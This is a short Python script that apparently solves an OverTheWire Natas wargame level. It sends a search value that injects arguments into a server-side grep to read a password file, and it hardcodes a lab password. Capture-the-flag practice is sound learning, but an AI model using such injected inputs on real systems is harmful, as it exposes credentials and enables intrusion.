#!/usr/bin/env python
import requests
payload={'needle':'c /etc/natas_webpass/natas11 /#','submit':'Search'}

url="http://natas11.natas.labs.overthewire.org"
r=requests.post(url, data=payload, auth=('natas11','U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'))


print r.text
